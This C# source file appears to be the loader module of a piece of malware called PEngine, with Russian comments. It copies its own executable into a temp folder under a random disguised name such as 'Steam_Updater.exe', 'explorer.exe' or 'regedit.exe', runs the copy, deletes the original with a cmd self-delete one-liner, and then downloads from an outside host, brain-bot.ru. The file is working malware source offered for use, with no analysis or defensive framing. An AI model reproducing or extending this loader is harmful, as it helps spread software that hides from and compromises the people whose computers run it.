namespace PEngine.Loader
{
    using PEngine.Helpers;
    using PEngine.Main;
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Security.Cryptography;

    public class MovEx
    {
        // Заметка: Скрываемый файл не удаляется!

        private static readonly List<string> FakeName = new List<string>()
        {
            "Updater.exe",
            "7-Zip_Installer.exe",
            "Winrar.exe",
            "Steam_Updater.exe",
            "MicrosoftUpdater.exe",
            "Ccleaner_Updater.exe",
            "Net_Framework_Updater.exe",
            "FireFox_Updater.exe",
            "Sandboxies.exe",
            "Microsoft SQL Server.exe",
            "CoreRuntime.exe",
            "Nvidia_Updater.exe",
            "Amd_Updater.exe",
            "Synaptics.exe",
            "Notepad++.exe",
            "splwow64.exe",
            "winhlp32.exe",
            "regedit.exe",
            "explorer.exe"
        };

        private static int GetNextInt32(RNGCryptoServiceProvider rnd)
        {
            byte[] randomInt = new byte[4];
            rnd.GetBytes(randomInt);
            return Convert.ToInt32(randomInt[0]);
        }

        public static string RandomProcessName = "";

        public static bool CheckPath()
        {
            HomeDirectory.Create(GlobalPath.GarbageTemp, true); // Создаём папку Garbage с удалением всех данных внутри перед началом.
            if (GlobalPath.NewStartupPath.Equals(GlobalPath.GarbageTemp)) // Проверяем наш файл есть ли в папке Garbage
            {
                return SafeDll.Download("https://brain-bot.ru");
            }
            else
            {
                GeName(GlobalPath.GarbageTemp);
                return CheckPath();
            }
        }

        private static bool GeName(string path)
        {
            using (var rnd = new RNGCryptoServiceProvider())
            {
                try
                {
                    foreach (string i in FakeName.OrderBy(x => GetNextInt32(rnd)).ToArray())
                    {
                        RandomProcessName = CombineEx.Combination(path, i);
                        break;
                    }
                    CombineEx.FileCopy(GlobalPath.AssemblyPath, RandomProcessName, false); // Перемещает запускаемый файл!
                    ProcessKiller.Running(RandomProcessName, false);
                    ProcessKiller.Delete("/C choice /C Y /N /D Y /T 0 & Del", GlobalPath.AssemblyPath);
                }
                catch { return false; }
                return true;
            }
        }
    }
}